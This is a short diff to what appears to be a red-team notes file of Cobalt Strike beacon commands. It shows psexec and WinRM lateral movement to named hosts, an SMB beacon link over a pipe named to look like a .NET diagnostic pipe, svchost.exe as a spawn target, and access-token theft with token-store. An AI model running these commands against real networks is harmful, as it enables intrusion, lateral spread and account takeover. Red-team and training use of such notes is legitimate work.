@@ -12,11 +12,18 @@ ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 
 Jump via psexec64
 ```powershell
-jump psexec64 lon-ws-1 smb
+jump psexec64 DUB-WEB-1 smb
+
+jump winrm64 DUB-WEB-1 smb
 ```
 
 ---
 
 ```powershell
 link smb 192.168.110.52 dotnet-diagnostic-1337
+```
+
+```powershell
+token-store steal 3184
+token-store use 0 
 ```
